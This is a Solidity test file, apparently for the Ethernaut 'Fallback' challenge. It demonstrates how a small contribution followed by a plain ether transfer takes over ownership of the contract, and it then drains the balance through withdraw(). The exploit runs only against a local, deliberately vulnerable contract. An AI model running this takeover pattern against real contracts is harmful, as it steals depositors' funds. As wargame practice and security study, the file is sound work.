//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../lib/forge-std/src/Test.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback private fallbackContract;
    address private changeOwner = makeAddr("LordAdhaar");
    uint256 private constant STARTING_BALANCE = 10 ether;

    function setUp() external {
        vm.deal(changeOwner, STARTING_BALANCE);
        fallbackContract = new Fallback();
    }

    function testContribution() public {
        //ARRANGE>ACT>ASSERT
        uint256 changeOwnerContribution;

        vm.startPrank(changeOwner);
        fallbackContract.contribute{value: 0.0001 ether}();
        changeOwnerContribution = fallbackContract.getContribution();
        vm.stopPrank();

        assertEq(changeOwnerContribution, 0.0001 ether);
    }

    function testOwnerIsChanged() public {
        address owner = fallbackContract.owner();
        bool success;

        vm.startPrank(changeOwner);
        fallbackContract.contribute{value: 0.0001 ether}();
        (success,) = address(fallbackContract).call{value: 0.1 ether}("");
        owner = fallbackContract.owner();
        vm.stopPrank();

        assertEq(owner, changeOwner);
    }

    function testWithdraw() public {
        bool sucess;
        uint256 startingChangeOwnerBalance = changeOwner.balance;

        vm.startPrank(changeOwner);
        fallbackContract.contribute{value: 0.0001 ether}();
        (sucess,) = address(fallbackContract).call{value: 0.1 ether}("");
        fallbackContract.withdraw();
        vm.stopPrank();

        uint256 endingChangeOwnerBalance = changeOwner.balance;
        uint256 endingContractBalance = address(fallbackContract).balance;

        assertEq(endingChangeOwnerBalance, startingChangeOwnerBalance);
        assertEq(endingContractBalance, 0 ether);
    }
}
